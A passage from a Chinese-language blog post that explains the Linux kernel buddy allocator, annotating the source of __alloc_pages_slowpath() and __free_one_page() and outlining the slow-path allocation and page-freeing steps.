class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *</span><br><span class="hljs-class">__<span class="hljs-title">alloc_pages_slowpath</span>(<span class="hljs-title">gfp_t</span> <span class="hljs-title">gfp_mask</span>, <span class="hljs-title">unsigned</span> <span class="hljs-title">int</span> <span class="hljs-title">order</span>,</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">alloc_context</span> *<span class="hljs-title">ac</span>)</span><br><span class="hljs-class">&#123;</span><br><span class="hljs-type">bool</span> can_direct_reclaim = gfp_mask &amp; __GFP_DIRECT_RECLAIM;<br><span class="hljs-type">const</span> <span class="hljs-type">bool</span> costly_order = order &gt; PAGE_ALLOC_COSTLY_ORDER;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span> =</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> alloc_flags;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> did_some_progress;<br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">compact_priority</span> <span class="hljs-title">compact_priority</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">compact_result</span> <span class="hljs-title">compact_result</span>;</span><br><span class="hljs-type">int</span> compaction_retries;<br><span class="hljs-type">int</span> no_progress_loops;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cpuset_mems_cookie;<br><span class="hljs-type">int</span> reserve_flags;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 我们还进行了健全性检查，以发现非原子上下文中的 caller 滥用原子储备（的行为）。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (WARN_ON_ONCE((gfp_mask &amp; (__GFP_ATOMIC|__GFP_DIRECT_RECLAIM)) ==<br>(__GFP_ATOMIC|__GFP_DIRECT_RECLAIM)))<br>gfp_mask &amp;= ~__GFP_ATOMIC;<br><br>retry_cpuset:<br>compaction_retries = <span class="hljs-number">0</span>;<br>no_progress_loops = <span class="hljs-number">0</span>;<br>compact_priority = DEF_COMPACT_PRIORITY;<br>cpuset_mems_cookie = read_mems_allowed_begin();<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 仅在 kswapd 需要被唤醒前，快速路径使用保守的 alloc_flags 才能成功，</span><br><span class="hljs-comment"> * 并且避免精确地设置 alloc_flags。 所以我们现在这么做。</span><br><span class="hljs-comment"> */</span><br>    <span class="hljs-comment">// 重新设置 alloc_flags，因为快速路径的分配在 kswapd 被唤醒之前</span><br>    <span class="hljs-comment">// 只有使用保守的 alloc_flags 才能成功，而现在我们将唤醒 kswapd，</span><br>    <span class="hljs-comment">// 因此恢复使用原有的 gfp_mask 对应的 alloc_flags</span><br>alloc_flags = gfp_to_alloc_flags(gfp_mask);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 我们需要为 zonelist 迭代器重新计算起始点，因为我们可能在快速路径中</span><br><span class="hljs-comment"> * 使用了不同的 nodemask ，或是有个 cpuset 的修改而我们正在重试</span><br><span class="hljs-comment"> * - 否则我们可能会无休止地迭代不合格的 zone</span><br><span class="hljs-comment"> */</span><br>ac-&gt;preferred_zoneref = first_zones_zonelist(ac-&gt;zonelist,<br>ac-&gt;highest_zoneidx, ac-&gt;nodemask);<br><span class="hljs-keyword">if</span> (!ac-&gt;preferred_zoneref-&gt;zone)<br><span class="hljs-keyword">goto</span> nopage;<br><br>    <span class="hljs-comment">// 如果 ALLOC_KSWAPD，唤醒 kswapd 线程回收内存</span><br><span class="hljs-keyword">if</span> (alloc_flags &amp; ALLOC_KSWAPD)<br>wake_all_kswapds(order, gfp_mask, ac);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 调整后的 alloc_flags 可能会立即成功，所以先进行尝试</span><br><span class="hljs-comment"> */</span><br>page = get_page_from_freelist(gfp_mask, order, alloc_flags, ac);<br><span class="hljs-keyword">if</span> (page)<br><span class="hljs-keyword">goto</span> got_pg;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 对于代价高的分配, 首先尝试直接的 compaction（译注：碎片整理机制）,</span><br><span class="hljs-comment"> * 因为有可能我们仍有足够的基本页面，并不需要去回收. 对于不可迁移的高阶分配，</span><br><span class="hljs-comment"> * 同样这么做, 因为 compaction 将尝试通过从相同迁移类型的块进行迁移</span><br><span class="hljs-comment"> * 以避免永久的碎片. 别对允许忽视水位线的分配尝试这个，因为</span><br><span class="hljs-comment"> * ALLOC_NO_WATERMARKS 还没发生。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (can_direct_reclaim &amp;&amp;<br>(costly_order ||<br>   (order &gt; <span class="hljs-number">0</span> &amp;&amp; ac-&gt;migratetype != MIGRATE_MOVABLE))<br>&amp;&amp; !gfp_pfmemalloc_allowed(gfp_mask)) &#123;<br>page = __alloc_pages_direct_compact(gfp_mask, order,<br>alloc_flags, ac,<br>INIT_COMPACT_PRIORITY,<br>&amp;compact_result);<br><span class="hljs-keyword">if</span> (page)<br><span class="hljs-keyword">goto</span> got_pg;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 检查带有 __GFP_NORETRY 的代价高的分配, 其</span><br><span class="hljs-comment"> * 包括一些 THP page fault 的分配</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (costly_order &amp;&amp; (gfp_mask &amp; __GFP_NORETRY)) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 若分配整个 pageblock(s) 且 compaction 由于所有的 zone</span><br><span class="hljs-comment"> * 都在水位线下失败了，或是被禁止了因为其最近在该order上失败了，</span><br><span class="hljs-comment"> * 除非分配器有请求的 compaction 与回收尝试，否则直接失败</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 回收是：</span><br><span class="hljs-comment"> *  - 可能非常昂贵因为 zones 可能远低于他们的低水位线，</span><br><span class="hljs-comment"> *    或是这是非常突发的高阶分配的一部分,</span><br><span class="hljs-comment"> *  - 不一定会有帮助因为 isolate_freepages() 可能不会在</span><br><span class="hljs-comment"> *    被释放的页面上迭代作为其线性扫描的一部分，且</span><br><span class="hljs-comment"> *  - 不大可能会让整个 pageblocks 自己释放</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (compact_result == COMPACT_SKIPPED ||<br>    compact_result == COMPACT_DEFERRED)<br><span class="hljs-keyword">goto</span> nopage;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 看起来好像 reclaim/compaction 是值得尝试的, 但</span><br><span class="hljs-comment"> * 同步的 compaction 可能会非常 expensive, 故保持</span><br><span class="hljs-comment"> * 使用异步的 compaction.</span><br><span class="hljs-comment"> */</span><br>compact_priority = INIT_COMPACT_PRIORITY;<br>&#125;<br>&#125;<br><br>retry:<br><span class="hljs-comment">/* 确保只要我们循环， kswapd 便不会意外地休眠 */</span><br><span class="hljs-keyword">if</span> (alloc_flags &amp; ALLOC_KSWAPD)<br>wake_all_kswapds(order, gfp_mask, ac);<br><br>reserve_flags = __gfp_pfmemalloc_flags(gfp_mask);<br><span class="hljs-keyword">if</span> (reserve_flags)<br>alloc_flags = current_alloc_flags(gfp_mask, reserve_flags);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 若内存策略可以忽略，重置 nodemask 与 zonelist 迭代器。</span><br><span class="hljs-comment"> * 这些分配具有高优先级与系统性，而非用户导向。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (!(alloc_flags &amp; ALLOC_CPUSET) || reserve_flags) &#123;<br>ac-&gt;nodemask = <span class="hljs-literal">NULL</span>;<br>ac-&gt;preferred_zoneref = first_zones_zonelist(ac-&gt;zonelist,<br>ac-&gt;highest_zoneidx, ac-&gt;nodemask);<br>&#125;<br><br><span class="hljs-comment">/* 带着可能调整过 zonelist 与 alloc_flags 再次尝试 */</span><br>page = get_page_from_freelist(gfp_mask, order, alloc_flags, ac);<br><span class="hljs-keyword">if</span> (page)<br><span class="hljs-keyword">goto</span> got_pg;<br><br><span class="hljs-comment">/* 调用方不想要回收, 我们无法平衡任何事 */</span><br><span class="hljs-keyword">if</span> (!can_direct_reclaim)<br><span class="hljs-keyword">goto</span> nopage;<br><br><span class="hljs-comment">/* 避免递归地直接回收 */</span><br><span class="hljs-keyword">if</span> (current-&gt;flags &amp; PF_MEMALLOC)<br><span class="hljs-keyword">goto</span> nopage;<br><br><span class="hljs-comment">/* 尝试直接回收后分配 */</span><br>page = __alloc_pages_direct_reclaim(gfp_mask, order, alloc_flags, ac,<br>&amp;did_some_progress);<br><span class="hljs-keyword">if</span> (page)<br><span class="hljs-keyword">goto</span> got_pg;<br><br><span class="hljs-comment">/* 尝试直接 compaction 后分配 */</span><br>page = __alloc_pages_direct_compact(gfp_mask, order, alloc_flags, ac,<br>compact_priority, &amp;compact_result);<br><span class="hljs-keyword">if</span> (page)<br><span class="hljs-keyword">goto</span> got_pg;<br><br><span class="hljs-comment">/* 若是特别指定的请求，不要循环 */</span><br><span class="hljs-keyword">if</span> (gfp_mask &amp; __GFP_NORETRY)<br><span class="hljs-keyword">goto</span> nopage;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 不要重试高花销的高阶分配除非他们是</span><br><span class="hljs-comment"> * __GFP_RETRY_MAYFAIL</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (costly_order &amp;&amp; !(gfp_mask &amp; __GFP_RETRY_MAYFAIL))<br><span class="hljs-keyword">goto</span> nopage;<br><br><span class="hljs-keyword">if</span> (should_reclaim_retry(gfp_mask, order, ac, alloc_flags,<br> did_some_progress &gt; <span class="hljs-number">0</span>, &amp;no_progress_loops))<br><span class="hljs-keyword">goto</span> retry;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 若0阶的回收无法取得任何进展，则重试 compaction 没有任何意义，</span><br><span class="hljs-comment"> * 因为当前对 compaction 的实现是基于有足够的空闲内存的</span><br><span class="hljs-comment"> *  (参见 __compaction_suitable)</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (did_some_progress &gt; <span class="hljs-number">0</span> &amp;&amp;<br>should_compact_retry(ac, order, alloc_flags,<br>compact_result, &amp;compact_priority,<br>&amp;compaction_retries))<br><span class="hljs-keyword">goto</span> retry;<br><br><br><span class="hljs-comment">/* 在我们开始 OOM killing 之前处理可能的 cpuset 更新竞争 */</span><br><span class="hljs-keyword">if</span> (check_retry_cpuset(cpuset_mems_cookie, ac))<br><span class="hljs-keyword">goto</span> retry_cpuset;<br><br><span class="hljs-comment">/* 回收失败了, 开始 killing 一些东西 */</span><br>    <span class="hljs-comment">// 要杀一些进程或是别的东西来腾内存了</span><br>page = __alloc_pages_may_oom(gfp_mask, order, ac, &amp;did_some_progress);<br><span class="hljs-keyword">if</span> (page)<br><span class="hljs-keyword">goto</span> got_pg;<br><br><span class="hljs-comment">/* 在无尽的循环中避免没有水位线的分配 */</span><br><span class="hljs-keyword">if</span> (tsk_is_oom_victim(current) &amp;&amp;<br>    (alloc_flags &amp; ALLOC_OOM ||<br>     (gfp_mask &amp; __GFP_NOMEMALLOC)))<br><span class="hljs-keyword">goto</span> nopage;<br><br><span class="hljs-comment">/* 若 OOM killer 取得了一些成效，重试 */</span><br><span class="hljs-keyword">if</span> (did_some_progress) &#123;<br>no_progress_loops = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">goto</span> retry;<br>&#125;<br><br>nopage:<br><span class="hljs-comment">/* 在我们失败之前处理可能的 cpuset 的更新竞争 */</span><br><span class="hljs-keyword">if</span> (check_retry_cpuset(cpuset_mems_cookie, ac))<br><span class="hljs-keyword">goto</span> retry_cpuset;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 确保 __GFP_NOFAIL 请求没有泄露且确保我们一直在重试</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (gfp_mask &amp; __GFP_NOFAIL) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 所有存在的 __GFP_NOFAIL 用户都是可以被阻塞的, </span><br><span class="hljs-comment"> * 故对任何新的实际上需要 GFP_NOWAIT 的用户进行警告</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (WARN_ON_ONCE(!can_direct_reclaim))<br><span class="hljs-keyword">goto</span> fail;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 这个上下文的 PF_MEMALLOC 请求非常奇怪</span><br><span class="hljs-comment"> * 因为我们不能回收任何东西只能循环等待</span><br><span class="hljs-comment"> * 某人来为我们做些什么</span><br><span class="hljs-comment"> */</span><br>WARN_ON_ONCE(current-&gt;flags &amp; PF_MEMALLOC);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 无失败的高开销的 orders 是一项艰巨的要求，</span><br><span class="hljs-comment"> * 我们对此并没有太多准备，故让我们警告这些用户</span><br><span class="hljs-comment"> * 以便于我们能够识别出他们并将之转化为别的东西</span><br><span class="hljs-comment"> */</span><br>WARN_ON_ONCE(order &gt; PAGE_ALLOC_COSTLY_ORDER);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 通过让他们能访问保留的内存来帮助非失败的分配</span><br><span class="hljs-comment"> * 但不使用 ALLOC_NO_WATERMARKS 因为这可能</span><br><span class="hljs-comment"> * 大量减少内存保留区而让情况更坏</span><br><span class="hljs-comment"> */</span><br>page = __alloc_pages_cpuset_fallback(gfp_mask, order, ALLOC_HARDER, ac);<br><span class="hljs-keyword">if</span> (page)<br><span class="hljs-keyword">goto</span> got_pg;<br><br>cond_resched();<br><span class="hljs-keyword">goto</span> retry;<br>&#125;<br>fail:<br>warn_alloc(gfp_mask, ac-&gt;nodemask,<br><span class="hljs-string">&quot;page allocation failure: order:%u&quot;</span>, order);<br>got_pg:<br><span class="hljs-keyword">return</span> page;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里我们先补充一个概念——<code>Memory compaction</code> 机制，其实就是整理内存碎片，对零散的内存页进行迁移，从而将零散的空闲内存页变成大块的空闲内存，不过这里只整理可以移动的碎片：</p><p><img src="https://i.loli.net/2021/11/30/q7T6EjtIb9PVFY3.png" alt="从知乎偷的图.png"></p><p>现在我们来看慢速分配的整个流程：</p><ul><li>使用原有的 gfp_flag 重新设置 alloc_flag，并重新计算 preferred zone，若设置了 <code>ALLOC_KSWAPD</code> 则调用 <code>wake_all_kswapds()</code> 唤醒 kswapd 线程进行内存回收</li><li>之后重新尝试快速路径的分配，若成功则直接返回</li><li>接下来调用 <code>__alloc_pages_direct_compact()</code> 进行 compaction，该函数内部在整理完后会重新尝试快速路径的分配，若成功则直接返回</li><li>（retry）接下来调用 <code>wake_all_kswapds()</code> 唤醒 kswapd 线程进行内存回收</li><li>调整 zonelist 与 alloc_flag，之后再次尝试快速路径分配，若成功则直接返回</li><li>若 gfp_flag 中没有 <code>__GFP_DIRECT_RECLAIM</code> 或是进程 PCB 的 flag 中有 <code>PF_MEMALLOC</code>，直接跳转到 （nopage）</li><li>调用 <code>__alloc_pages_direct_reclaim()</code> 进行内存回收（内部调用 <code>__perform_reclaim()</code>）与快速路径分配，若成功则直接返回</li><li>调用 <code>__alloc_pages_direct_compact()</code> 进行 compaction 与快速路径分配，若成功则直接返回</li><li>如果设置了 <code>__GFP_NORETRY</code> ，或是该次内存分配开销较高（<code>order &gt; PAGE_ALLOC_COSTLY_ORDER</code>）且未设置 <code>__GFP_RETRY_MAYFAIL</code>，直接跳到 （nopage）</li><li>调用 <code>should_reclaim_retry()</code> 判断是否需要重新回收，若是则跳回（retry）</li><li>调用 <code>should_compact_retry()</code> 判断是否需要重新进行 compaction，若是则跳回（retry）</li><li>调用 <code>check_retry_cpuset()</code> 检查 cpuset 是否发生变化，若是则跳转回开头</li><li>调用 <code>__alloc_pages_may_oom()</code> 尝试 kill 一些进程来释放内存，该函数内首先还是会先进行一次快速分配，之后才是调用 <code>out_of_memory()</code> 来杀掉最适合的进程以释放内存，最后若设置了 <code>__GFP_NOFAIL</code> 则调用 <code>__alloc_pages_cpuset_fallback()</code> 再次尝试内存分配，在该函数中会两次走快速路径进行分配（第一次会额外附加上 <code>ALLOC_CPUSET</code> 的 flag）</li><li>如果把当前进程杀掉了，跳到（nopage）；如果杀进程取得了成效，跳回（retry）</li><li>（nopage）调用 <code>check_retry_cpuset()</code> 检查 cpuset 是否发生变化，若是则跳转回开头</li><li>若设置了 <code>__GFP_NOFAIL</code> 则进行一系列的警告，并调用 <code>__alloc_pages_cpuset_fallback()</code> 再次尝试内存分配，若未成功则跳回（retry）</li><li>返回结果</li></ul><p><img src="https://s2.loli.net/2022/07/06/eCg12KJIZuw9aon.png" alt="image.png"></p><h2 id="四、上层封装分配函数"><a href="#四、上层封装分配函数" class="headerlink" title="四、上层封装分配函数"></a>四、<em>上层封装分配函数</em></h2><p>在 <code>__alloc_pages_nodemask()</code> 上层主要有三个页面分配函数，其调用路径如下：</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-variable">__alloc_pages_node</span>  <span class="hljs-comment">/*返回struct page的指针*/</span><br>    <span class="hljs-variable">__alloc_pages</span><br>    <span class="hljs-variable">__alloc_pages_nodemask</span><br><br>alloc_pages         <span class="hljs-comment">/*返回struct page的指针*/</span><br>    alloc_pages_current<br>    <span class="hljs-variable">__alloc_pages_nodemask</span><br>        <br><span class="hljs-variable">__get_free_pages</span>    <span class="hljs-comment">/*返回页面的虚拟地址*/</span><br>    alloc_pages<br>        alloc_pages_current<br>            <span class="hljs-variable">__alloc_pages_nodemask</span><br></code></pre></td></tr></table></figure><h1 id="0x03-页的释放"><a href="#0x03-页的释放" class="headerlink" title="0x03.页的释放"></a>0x03.页的释放</h1><p>前面我们讲了页面是如何分配的，现在我们来看页面是如何释放的</p><h2 id="一、-free-one-page-：释放页面的核心函数"><a href="#一、-free-one-page-：释放页面的核心函数" class="headerlink" title="一、__free_one_page()：释放页面的核心函数"></a>一、__free_one_page()：释放页面的核心函数</h2><p>该函数是 buddy system 中用以进行页面释放的<strong>核心函数</strong>，所有的页面释放 API 都是基于该函数的封装</p><p>该函数定义于 <code>/mm/page_alloc.c</code> 中，主要作用是将特定页面释放到特定 zone 上，需要注意的是这里的 <code>one page</code> 不是一张页框而是一块连续内存（可能有多张页）</p><p>还需要注意的是这是一个释放页面的<strong>基本函数</strong>，故我们需要提供待释放页面的页结构体（struct page）、页框号、页面块的阶（order）、目标 zone、迁移类型等信息——这些信息通常由上层封装函数提供，这个函数所做的只是简单地将页挂回对应链表并检查合并的操作</p><p>如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * buddy system 分配器的释放函数.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * buddy system 的想法是为多种“orders”的内存块</span><br><span class="hljs-comment"> * 维护一个直接映射表（包含位值）. 底部级别的表包含</span><br><span class="hljs-comment"> * 对最小的可分配内存单元（这里便是页面）的映射,</span><br><span class="hljs-comment"> * 而往上每更高一级则描述了从其下的一级的一对单元，因此是&quot;buddies&quot;.</span><br><span class="hljs-comment"> * 从高层看，这里所做的仅是在标记底层可用的表项，</span><br><span class="hljs-comment"> * 并根据需要向上传播更改，再加上一些与 VM 系统的其他部分</span><br><span class="hljs-comment"> * 良好协作所需要的计数。</span><br><span class="hljs-comment"> * 在每个级别, 我们都保持一个 pages 的 list, 作为连续的</span><br><span class="hljs-comment"> * 长度为(1 &lt;&lt; order)的空闲页的头节点并标记上 PageBuddy.</span><br><span class="hljs-comment"> * Page&#x27;s order 被记录在 page_private(page) 域.</span><br><span class="hljs-comment"> * 故当我们在分配或释放其一时, 我们可以得到另一个的状态。</span><br><span class="hljs-comment"> * 也就是说，若我们分配一个小的块，而两个都是空闲的，</span><br><span class="hljs-comment"> * 区域的剩余部分必须被分割成块. 若一个块被释放了，</span><br><span class="hljs-comment"> * 而他的 buddy 也是闲置的, 那么这将触发合并成一个更大的块</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * -- nyc</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> __free_one_page(<span class="hljs-keyword">struct</span> page *page,<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> pfn,<br><span class="hljs-keyword">struct</span> zone *zone, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> order,<br><span class="hljs-type">int</span> migratetype, <span class="hljs-type">fpi_t</span> fpi_flags)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">capture_control</span> *<span class="hljs-title">capc</span> =</span> task_capc(zone);<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> buddy_pfn;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> combined_pfn;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> max_order;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">buddy</span>;</span><br><span class="hljs-type">bool</span> to_tail;<br><br>    <span class="hljs-comment">// 这里的 MAX_ORDER 和 pageblock_order 都是宏</span><br>max_order = <span class="hljs-type">min_t</span>(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>, MAX_ORDER - <span class="hljs-number">1</span>, pageblock_order);<br><br>VM_BUG_ON(!zone_is_initialized(zone));<br>VM_BUG_ON_PAGE(page-&gt;flags &amp; PAGE_FLAGS_CHECK_AT_PREP, page);<br><br>VM_BUG_ON(migratetype == <span class="hljs-number">-1</span>);<br><span class="hljs-keyword">if</span> (likely(!is_migrate_isolate(migratetype)))<br>__mod_zone_freepage_state(zone, <span class="hljs-number">1</span> &lt;&lt; order, migratetype);<br><br>VM_BUG_ON_PAGE(pfn &amp; ((<span class="hljs-number">1</span> &lt;&lt; order) - <span class="hljs-number">1</span>), page);<br>VM_BUG_ON_PAGE(bad_range(zone, page), page);<br><br>continue_merging:<br><span class="hljs-keyword">while</span> (order &lt; max_order) &#123;<br><span class="hljs-keyword">if</span> (compaction_capture(capc, page, order, migratetype)) &#123;<br>__mod_zone_freepage_state(zone, -(<span class="hljs-number">1</span> &lt;&lt; order),<br>migratetype);<br><span class="hljs-keyword">return</span>;<br>&#125;<br>buddy_pfn = __find_buddy_pfn(pfn, order);<span class="hljs-comment">// 计算 buddy 页框号</span><br>buddy = page + (buddy_pfn - pfn);<span class="hljs-comment">// 计算 buddy 的页结构体，注意这里是指针加法</span><br><br><span class="hljs-keyword">if</span> (!pfn_valid_within(buddy_pfn)) <span class="hljs-comment">// 页框号合法性检查</span><br><span class="hljs-keyword">goto</span> done_merging;<br><span class="hljs-keyword">if</span> (!page_is_buddy(page, buddy, order))  <span class="hljs-comment">// 检查 page 和 buddy 是否是一对</span><br><span class="hljs-keyword">goto</span> done_merging;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 我们的 buddy（译注：释放页面的“配对”页面，可以看开头的注释） 是空闲的</span><br><span class="hljs-comment"> * 或其为 CONFIG_DEBUG_PAGEALLOC 的 guard 